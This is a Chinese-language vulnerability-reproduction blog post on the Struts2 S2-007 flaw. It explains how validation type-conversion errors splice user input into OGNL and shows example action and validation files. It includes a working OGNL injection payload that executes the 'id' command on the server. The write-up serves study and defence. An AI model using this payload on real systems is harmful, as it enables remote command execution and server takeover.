---
title: S2-007 远程代码执行漏洞
date: 2020-07-29 21:45:51
categories: 漏洞复现
tags: struts2
---

#### 背景

当配置了验证规则 `-validation.xml` 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回。

影响版本：

> ​	2.0.0 - 2.2.3

<!--more-->

#### 复现过程

例如有 UserAction：

```java
(...)
public class UserAction extends ActionSupport {
	private Integer age;
	private String name;
	private String email;

(...)
```

然后配置有 UserAction-validation.xml：

```java
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE validators PUBLIC
	"-//OpenSymphony Group//XWork Validator 1.0//EN"
	"http://www.opensymphony.com/xwork/xwork-validator-1.0.2.dtd">
<validators>
	<field name="age">
		<field-validator type="int">
			<param name="min">1</param>
			<param name="max">150</param>
		</field-validator>
	</field>
</validators>
```

当用户提交 age 为字符串而非整形数值时，后端用代码拼接 `"'" + value + "'"` 然后对其进行 OGNL 表达式解析。要成功利用，只需要找到一个配置了类似验证规则的表单字段使之转换出错，借助类似 SQLi 注入单引号拼接的方式即可注入任意 OGNL 表达式。

POC:

```java
' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())) + '
```

![](http://qn.laohuan.xin/2020-07-29_22-03-52.png)

#### 参考文章

<http://github.com/vulhub/vulhub/blob/master/struts2/s2-007/README.zh-cn.md/>